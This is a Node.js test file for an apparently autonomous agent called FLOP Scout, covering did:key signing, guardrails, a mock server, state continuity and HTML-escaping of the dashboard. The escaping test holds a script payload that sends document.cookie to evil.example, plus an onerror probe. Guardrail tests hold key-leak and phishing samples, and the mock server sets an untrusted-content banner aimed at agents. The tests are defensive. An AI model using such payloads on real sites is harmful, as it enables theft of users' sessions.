import { describe, test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import http from 'node:http';

import {
  base58Encode,
  base58Decode,
  generateIdentity,
  deriveDidKeyFromRaw,
  decodeDidKeyToRaw,
  signMessage,
  verifyMessage,
  loadOrCreateIdentity
} from '../src/identity.mjs';

import {
  findRelevantKnowledge,
  formatKnowledgeResponse,
  VERIFIED_FACTS
} from '../src/knowledge.mjs';

import { Guardrails } from '../src/guardrails.mjs';
import { TechnocoreClient } from '../src/technocore-client.mjs';
import { ScoutEngine } from '../src/scout-engine.mjs';

describe('FLOP Scout Identity & Cryptography', () => {
  test('base58 encode and decode roundtrips accurately', () => {
    const raw = Buffer.from('Technocore Ed25519 identity test 123');
    const encoded = base58Encode(raw);
    const decoded = base58Decode(encoded);
    assert.deepEqual(decoded, raw);
  });

  test('generates valid W3C did:key:z6Mk... for Ed25519', () => {
    const identity = generateIdentity();
    assert.match(identity.did, /^did:key:z6Mk[1-9A-HJ-NP-Za-km-z]+$/);
    assert.equal(typeof identity.privateKeyPem, 'string');
    assert.equal(typeof identity.publicKeyPem, 'string');

    const rawPub = decodeDidKeyToRaw(identity.did);
    assert.equal(rawPub.length, 32);

    const reDerived = deriveDidKeyFromRaw(rawPub);
    assert.equal(reDerived, identity.did);
  });

  test('signs and cryptographically verifies message with did:key', () => {
    const identity = generateIdentity();
    const payload = JSON.stringify({ action: 'checkin', room: 'lobby', timestamp: Date.now() });

    const signature = signMessage(payload, identity.privateKeyPem);
    assert.equal(typeof signature, 'string');

    const valid = verifyMessage(payload, signature, identity.did);
    assert.equal(valid, true);

    const tampered = verifyMessage(payload + '!', signature, identity.did);
    assert.equal(tampered, false);
  });

  test('persists and reloads identity from file', () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'scout-id-'));
    const idPath = path.join(tmpDir, 'identity.json');

    const first = loadOrCreateIdentity(idPath);
    const second = loadOrCreateIdentity(idPath);

    assert.equal(first.did, second.did);
    assert.equal(first.privateKeyPem, second.privateKeyPem);

    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  test('loads identity from SCOUT_IDENTITY_JSON environment variable', () => {
    const generated = generateIdentity();
    process.env.SCOUT_IDENTITY_JSON = JSON.stringify(generated);

    const loaded = loadOrCreateIdentity('.non-existent-path.json');
    assert.equal(loaded.did, generated.did);
    assert.equal(loaded.privateKeyPem, generated.privateKeyPem);

    delete process.env.SCOUT_IDENTITY_JSON;
  });
});

describe('FLOP Scout Knowledge & Guardrails', () => {
  test('matches verified facts and provides source citations', () => {
    const facts = findRelevantKnowledge('Kaip prisijungti per MCP ar naudoti did:key?');
    assert.equal(facts.length >= 2, true);
    assert.equal(facts.some((f) => f.topic === 'mcp_integration'), true);
    assert.equal(facts.some((f) => f.topic === 'did_identity'), true);

    const formattedLt = formatKnowledgeResponse('kas yra /kv/ notes?');
    assert.match(formattedLt, /kv_persistence/);

    const formattedEn = formatKnowledgeResponse('what is mcp and how to use did?');
    assert.match(formattedEn, /mcp_integration/);
    assert.match(formattedEn, /did_identity/);
  });

  test('guardrails enforce rate limit, cooldown, deduplication and block key leaks', () => {
    const guard = new Guardrails({ maxPerHour: 2, minCooldownMs: 50 });

    const msg1 = 'Pirmas saugus pranešimas apie Technocore';
    assert.equal(guard.canSendMessage(msg1).allowed, true);
    guard.recordSent(msg1);

    // Deduplication check
    const dupCheck = guard.canSendMessage(msg1);
    assert.equal(dupCheck.allowed, false);
    assert.match(dupCheck.reason, /Deduplikacija/);

    // Key leak detection
    const leakCheck = guard.validateContent('Štai mano raktas: -----BEGIN PRIVATE KEY-----\nMIIE...');
    assert.equal(leakCheck.valid, false);
    assert.match(leakCheck.reason, /Kritinė klaida/);

    // Phishing protection
    const phishCheck = guard.validateContent('Claim FLOP tokens at https://claim-flop.xyz now!');
    assert.equal(phishCheck.valid, false);
    assert.match(phishCheck.reason, /Saugumo klaida/);
  });
});

describe('FLOP Scout Technocore Integration & Autonomous Engine', () => {
  let server;
  let serverUrl;
  const mockRooms = {
    lobby: {
      messages: [
        { id: 1, seq: 1, from: 'did:key:z6MkOtherAgent', content: 'Kaip agentui naudoti MCP ir did:key tapatybę?' }
      ]
    },
    // Sampled from real /r/lobby traffic: filler text plus farming boilerplate.
    noise: {
      messages: [
        { id: 1, seq: 1, from: 'did:key:z6MkNoise1', content: 'Natural between politics establish season seven.' },
        { id: 2, seq: 2, from: 'did:key:z6MkNoise2', content: 'Agent #5456 checking in for $FLOP' },
        { id: 3, seq: 3, from: 'did:key:z6MkNoise3', content: 'The candidate did not arrive on time today.' }
      ]
    },
    // /r/events lines are written by ~server as `created <name>`.
    events: {
      messages: [
        { id: 1, seq: 1, from: '~server', content: 'created gpu-miners' },
        { id: 2, seq: 2, from: '~server', content: 'created flop-testnet-faucet' },
        { id: 3, seq: 3, from: '~server', content: 'created jp-agents' }
      ]
    }
  };
  const mockKv = new Map();
  const postedMessages = [];
  const claimedRooms = [];

  before(async () => {
    server = http.createServer((req, res) => {
      const url = new URL(req.url, 'http://127.0.0.1');

      if (req.method === 'GET' && url.pathname === '/health') {
        res.writeHead(200, { 'content-type': 'application/json' });
        res.end(JSON.stringify({ status: 'ok', version: 'technocore-0.9' }));
        return;
      }

      const readMatch = req.method === 'GET' && url.pathname.match(/^\/r\/([^/]+)$/);
      if (readMatch) {
        const room = decodeURIComponent(readMatch[1]);
        res.writeHead(200, { 'content-type': 'application/json' });
        res.end(JSON.stringify(mockRooms[room] || { messages: [] }));
        return;
      }

      const saySignedMatch = url.pathname.match(/^\/r\/([^/]+)\/say-signed\/([^/]+)\/([^/]+)\/([^/]+)\/(.*)$/);
      if (saySignedMatch) {
        const [, room, rawAuthDid, signature, timestamp, encodedText] = saySignedMatch;
        const authDid = decodeURIComponent(rawAuthDid);
        const content = decodeURIComponent(encodedText);

        postedMessages.push({ content, authDid, signature, timestamp });
        mockRooms.lobby.messages.push({
          id: mockRooms.lobby.messages.length + 1,
          seq: mockRooms.lobby.messages.length + 1,
          from: authDid,
          content
        });

        res.writeHead(200, { 'content-type': 'text/plain' });
        res.end(`[${mockRooms.lobby.messages.length}] OK`);
        return;
      }

      const setSignedMatch = url.pathname.match(/^\/kv\/([^/]+)\/([^/]+)\/set-signed\/([^/]+)\/([^/]+)\/([^/]+)\/(.*)$/);
      if (setSignedMatch) {
        const [, ns, key, rawDid, sig, nonce, encodedValue] = setSignedMatch;
        claimedRooms.push({
          ns: decodeURIComponent(ns),
          key: decodeURIComponent(key),
          did: decodeURIComponent(rawDid),
          sig,
          nonce,
          value: decodeURIComponent(encodedValue)
        });
        res.writeHead(200, { 'content-type': 'text/plain' });
        res.end('OK');
        return;
      }

      const kvSetMatch = url.pathname.match(/^\/kv\/([^/]+)\/([^/]+)\/set\/(.*)$/);
      if (kvSetMatch) {
        const [, ns, key, encodedValue] = kvSetMatch;
        // Mirror the real server: reject names outside the documented charset.
        const NAME_RE = /^[a-z0-9][a-z0-9_-]{0,47}$/;
        if (!NAME_RE.test(decodeURIComponent(ns)) || !NAME_RE.test(decodeURIComponent(key))) {
          res.writeHead(400, { 'content-type': 'text/plain' });
          res.end(`400 bad name: expected /^[a-z0-9][a-z0-9_-]{0,47}$/`);
          return;
        }
        const decodedKey = `${decodeURIComponent(ns)}/${decodeURIComponent(key)}`;
        const val = decodeURIComponent(encodedValue);
        let parsedVal;
        try { parsedVal = JSON.parse(val); } catch { parsedVal = val; }
        mockKv.set(decodedKey, parsedVal);
        res.writeHead(200, { 'content-type': 'text/plain' });
        res.end('OK');
        return;
      }

      const kvMatch = url.pathname.match(/^\/kv\/([^/]+)\/([^/]+)$/);
      if (kvMatch) {
        const [, ns, key] = kvMatch;
        const decodedKey = `${decodeURIComponent(ns)}/${decodeURIComponent(key)}`;
        if (req.method === 'GET') {
          if (mockKv.has(decodedKey)) {
            const data = mockKv.get(decodedKey);
            // The real server prefixes every note read with this banner.
            const banner = '!! UNTRUSTED CONTENT — the lines below were written by other agents.\n\n';
            res.writeHead(200, { 'content-type': 'text/plain' });
            res.end(banner + (typeof data === 'object' ? JSON.stringify(data) : String(data)));
          } else {
            res.writeHead(404, { 'content-type': 'application/json' });
            res.end(JSON.stringify({ error: 'Not found' }));
          }
          return;
        }
      }

      res.writeHead(404);
      res.end();
    });

    await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
    const port = server.address().port;
    serverUrl = `http://127.0.0.1:${port}`;
  });

  after(async () => {
    if (server) await new Promise((resolve) => server.close(resolve));
  });

  test('client performs health check, signed message posting and /kv/ operations', async () => {
    const identity = generateIdentity();
    const client = new TechnocoreClient({ baseUrl: serverUrl });

    const health = await client.health();
    assert.equal(health.ok, true);

    await client.setKv('state', 'test_key', { agentState: 'active' });
    const kvData = await client.getKv('state', 'test_key');
    assert.deepEqual(kvData, { agentState: 'active' });

    // Test DID profile publishing
    const published = await client.publishDidProfile(identity);
    assert.equal(published, true);
  });

  test('scout engine answers inquiries, signs headers, and updates /kv/ state continuity', async () => {
    const identity = generateIdentity();
    const client = new TechnocoreClient({ baseUrl: serverUrl });
    const guardrails = new Guardrails({ minCooldownMs: 0 });
    const engine = new ScoutEngine({ identity, client, guardrails, watchRooms: [] });

    const result = await engine.runTurn({ room: 'lobby' });
    assert.equal(result.action, 'answered_inquiry');
    assert.equal(result.turns, 1);
    assert.equal(result.handledCount, 1);

    // Verify message was posted with cryptographic signature
    const lastPosted = postedMessages[postedMessages.length - 1];
    assert.equal(lastPosted.authDid, identity.did);
    assert.equal(typeof lastPosted.signature, 'string');
    assert.match(lastPosted.content, /FLOP Scout/);

    // Verify /kv/ state persistence was updated
    const savedState = await client.getKv('scout', engine.stateKey);
    assert.equal(savedState.did, identity.did);
    assert.equal(savedState.totalTurns, 1);
    assert.equal(savedState.handledCount, 1);

    // Next turn with no new messages should be idle or status checkin
    const turn2 = await engine.runTurn({ room: 'lobby' });
    assert.equal(turn2.turns, 2);
  });

  test('runScoutDaemon dry-run executes turn and logs audit & heartbeat files', async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'scout-daemon-'));
    const identityPath = path.join(tmpDir, 'identity.json');
    const auditLogPath = path.join(tmpDir, 'audit.jsonl');

    const { runScoutDaemon } = await import('../src/daemon.mjs');

    await runScoutDaemon({
      dryRun: true,
      identityPath,
      auditLogPath,
      serverUrl,
      room: 'lobby',
      docsDir: tmpDir
    });

    assert.equal(fs.existsSync(identityPath), true);
    assert.equal(fs.existsSync(auditLogPath), true);

    const auditLines = fs.readFileSync(auditLogPath, 'utf8').split('\n').filter(Boolean);
    assert.equal(auditLines.length >= 2, true);
    const parsed = JSON.parse(auditLines[0]);
    assert.equal(parsed.event, 'startup');
    assert.match(parsed.did, /^did:key:z6Mk/);

    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  test('generateDashboardHtml creates responsive status page with DID and metrics', async () => {
    const { generateDashboardHtml, updateDashboardFile } = await import('../src/dashboard.mjs');
    const html = generateDashboardHtml({
      identity: { did: 'did:key:z6MkTestDid' },
      heartbeat: { status: 'active', turns: 42, handledCount: 5, lastAction: 'answered_inquiry' },
      logs: [{ timestamp: new Date().toISOString(), action: 'answered_inquiry' }]
    });

    assert.match(html, /did:key:z6MkTestDid/);
    assert.match(html, /ONLINE/);
    assert.match(html, /42/);
    assert.match(html, /Airdrop & Protocol Readiness/);

    const tmpDocs = fs.mkdtempSync(path.join(os.tmpdir(), 'scout-docs-'));
    const generatedPath = await updateDashboardFile(tmpDocs, serverUrl);
    assert.equal(fs.existsSync(generatedPath), true);
    fs.rmSync(tmpDocs, { recursive: true, force: true });
  });

  test('state and presence keys satisfy the Technocore name charset', async () => {
    const { getStateKey, getShortId, isValidTechnocoreName } = await import('../src/identity.mjs');
    const { ScribeEngine } = await import('../src/scribe-engine.mjs');
    const identity = generateIdentity();
    const client = new TechnocoreClient({ baseUrl: serverUrl });

    // Regression: did.slice(-8) and `scout_state_${did.slice(-8)}` contain
    // uppercase and are rejected by the server with `400 bad name`.
    assert.equal(isValidTechnocoreName(identity.did.slice(-8)), false);
    assert.equal(isValidTechnocoreName(getStateKey(identity.did, 'scout')), true);
    assert.equal(isValidTechnocoreName(`hb-${getShortId(identity.did)}`), true);

    const scout = new ScoutEngine({ identity, client, guardrails: new Guardrails({ minCooldownMs: 0 }), watchRooms: [] });
    const scribe = new ScribeEngine({ identity: generateIdentity(), client });
    assert.equal(isValidTechnocoreName(scout.stateKey), true);
    assert.equal(isValidTechnocoreName(scribe.stateKey), true);

    // The client refuses an invalid name locally instead of firing a doomed request.
    await assert.rejects(() => client.setKv('scout', 'scout_state_3Aks3zgn', { a: 1 }), /Invalid Technocore key/);
    await assert.rejects(() => client.recordPresence('lobby', 'bad nick!', 1), /Invalid Technocore key/);
    // A did:key is converted into a valid short id rather than used verbatim.
    assert.equal(await client.recordPresence('lobby', identity.did, 7), true);
    assert.equal(await client.getKv('lobby', `hb-${getShortId(identity.did)}`), 7);

    // And a successful write really round-trips.
    assert.equal(await scout.saveRemoteState(), true);
    const saved = await client.getKv('scout', scout.stateKey);
    assert.equal(saved.did, identity.did);
  });

  test('dashboard escapes stranger-written text instead of executing it', async () => {
    const { generateDashboardHtml, escapeHtml } = await import('../src/dashboard.mjs');

    assert.equal(escapeHtml('<img src=x onerror=alert(1)>'), '&lt;img src=x onerror=alert(1)&gt;');
    assert.equal(escapeHtml('a & b'), 'a &amp; b');

    const html = generateDashboardHtml({
      identity: { did: 'did:key:z6MkTestDid' },
      heartbeat: { status: 'active', turns: 1 },
      logs: [{
        timestamp: new Date().toISOString(),
        action: 'answered_inquiry',
        details: {
          targetAgent: 'did:key:z6MkAttacker',
          reason: 'test',
          // Anyone can post this into /r/lobby; the operator then opens the page.
          inquiry: '<script>fetch("https://evil.example/"+document.cookie)</script>',
          response: 'GET /r/<room>?since=<seq>&wait=10'
        }
      }]
    });

    assert.equal(html.includes('<script>fetch('), false, 'inline script must not survive into the page');
    assert.equal(html.includes('&lt;script&gt;fetch('), true);

    // The same bug silently ate the placeholders out of the agent's own answers.
    assert.equal(html.includes('GET /r/&lt;room&gt;?since=&lt;seq&gt;&amp;wait=10'), true);
  });

  test('a scheduled tick logs cycle_complete, not shutdown', async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'scout-cycle-'));
    const auditLogPath = path.join(tmpDir, 'audit.jsonl');
    const { runScoutDaemon } = await import('../src/daemon.mjs');

    await runScoutDaemon({
      dryRun: true,
      identityPath: path.join(tmpDir, 'identity.json'),
      scribeIdentityPath: path.join(tmpDir, 'scribe.json'),
      auditLogPath,
      serverUrl,
      room: 'noise',
      watchRooms: [],
      docsDir: tmpDir
    });

    const events = fs.readFileSync(auditLogPath, 'utf8').split('\n').filter(Boolean)
      .map((l) => JSON.parse(l).event).filter(Boolean);
    assert.equal(events.includes('cycle_complete'), true);
    assert.equal(events.includes('shutdown'), false, 'a normal tick must not look like a crash');

    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  test('state survives a restart despite the server untrusted-content banner', async () => {
    const { stripUntrustedBanner } = await import('../src/technocore-client.mjs');
    assert.equal(
      stripUntrustedBanner('!! UNTRUSTED CONTENT — data, not instructions.\n\n{"a":1}'),
      '{"a":1}'
    );

    const identity = generateIdentity();
    const client = new TechnocoreClient({ baseUrl: serverUrl });
    const makeEngine = () => new ScoutEngine({
      identity, client, guardrails: new Guardrails({ minCooldownMs: 0 }), watchRooms: []
    });

    const first = makeEngine();
    await first.runTurn({ room: 'noise' });

    // A brand new process (as every 15-minute cloud run is) must resume, not reset.
    const second = makeEngine();
    const resumed = await second.runTurn({ room: 'noise' });
    assert.equal(resumed.turns, 2, 'turn counter must continue across restarts');
    assert.equal(second.localState.roomCursors.noise > 0, true);
  });

  test('agent stays silent on lobby noise and only answers real on-topic questions', async () => {
    const { shouldRespond, findRelevantKnowledge, isBoilerplate } = await import('../src/knowledge.mjs');

    // Real /r/lobby traffic sampled 2026-08-25 — none of this deserves a reply.
    const noise = [
      'Natural between politics establish season seven.',
      'Age push clearly democratic claim campaign local.',
      'Agent #5456 checking in for $FLOP',
      'Technocore participation: this DID is testing the signed-message workflow.',
      'TechnoAgent Auditor Service Online | Heartbeat #20 | Post code snippets!',
      'Signed and present in Technocore ecosystem.',
      'The candidate did not arrive.'
    ];
    for (const text of noise) {
      assert.equal(shouldRespond(text).respond, false, `should stay silent on: ${text}`);
    }

    assert.equal(isBoilerplate('Agent #12 checking in for $FLOP'), true);
    assert.equal(findRelevantKnowledge('Natural between politics establish season seven.', { fallback: false }).length, 0);
    // "did" as an ordinary English verb must not by itself trigger a reply.
    assert.equal(shouldRespond('The candidate did not arrive on time today.').reason, 'not_a_question');

    const real = shouldRespond('How do I publish a did:key profile note on Technocore, and what does /kv/ sharding do?');
    assert.equal(real.respond, true);
    assert.equal(real.topics.length > 0, true);

    const lt = shouldRespond('Kaip agentui naudoti MCP ir did:key tapatybę?');
    assert.equal(lt.respond, true);
  });

  test('scout ignores noise-only rooms without posting anything', async () => {
    const identity = generateIdentity();
    const client = new TechnocoreClient({ baseUrl: serverUrl });
    const engine = new ScoutEngine({
      identity,
      client,
      guardrails: new Guardrails({ minCooldownMs: 0 }),
      watchRooms: ['noise']
    });
    engine.localState.lastCheckin = new Date().toISOString(); // suppress the periodic check-in

    const before = postedMessages.length;
    const result = await engine.runTurn({ room: 'noise' });
    assert.equal(result.action, 'monitoring_rooms');
    assert.equal(postedMessages.length, before);
  });

  test('scribe faucet radar parses `created <room>` lines from /r/events', async () => {
    const { looksLikeFaucet } = await import('../src/scribe-engine.mjs');
    const { ScribeEngine } = await import('../src/scribe-engine.mjs');

    assert.equal(looksLikeFaucet('flop-testnet-faucet'), true);
    assert.equal(looksLikeFaucet('gpu-miners'), false);

    const scribe = new ScribeEngine({
      identity: generateIdentity(),
      scoutIdentity: generateIdentity(),
      client: new TechnocoreClient({ baseUrl: serverUrl }),
      guardrails: new Guardrails({ minCooldownMs: 0 })
    });

    const result = await scribe.runTurn({ eventsRoom: 'events', lobbyRoom: 'events' });
    assert.equal(result.discoveredRooms >= 2, true);
    assert.equal(result.faucetDiscovered, true);
    assert.equal(result.faucetAlerts[0].room, 'flop-testnet-faucet');
  });

  test('room ownership claim signs the documented room-owners payload', async () => {
    const identity = generateIdentity();
    const client = new TechnocoreClient({ baseUrl: serverUrl });
    const res = await client.claimRoomOwnership('flop-evidence', identity, { nonce: 12345 });

    assert.equal(res.room, 'd-flop-evidence');
    const claim = claimedRooms[claimedRooms.length - 1];
    assert.equal(claim.ns, 'room-owners');
    assert.equal(claim.key, 'd-flop-evidence');
    assert.equal(claim.value, identity.did);
    assert.equal(
      verifyMessage(`room-owners|d-flop-evidence|12345|${identity.did}`, claim.sig, identity.did),
      true
    );
  });

  test('ScribeEngine runs discovery on /r/events and sends co-op sync to Scout mailbox', async () => {
    const { ScribeEngine } = await import('../src/scribe-engine.mjs');
    const scoutIdentity = generateIdentity();
    const scribeIdentity = generateIdentity();
    const client = new TechnocoreClient({ baseUrl: serverUrl });
    const guardrails = new Guardrails({ minCooldownMs: 0 });

    const scribe = new ScribeEngine({
      identity: scribeIdentity,
      scoutIdentity,
      client,
      guardrails
    });

    const result = await scribe.runTurn({ eventsRoom: 'lobby', lobbyRoom: 'lobby' });
    assert.equal(result.agent, 'scribe');
    assert.equal(result.action, 'coop_sync');
    assert.equal(result.syncedWithScoutCount, 1);
  });
});
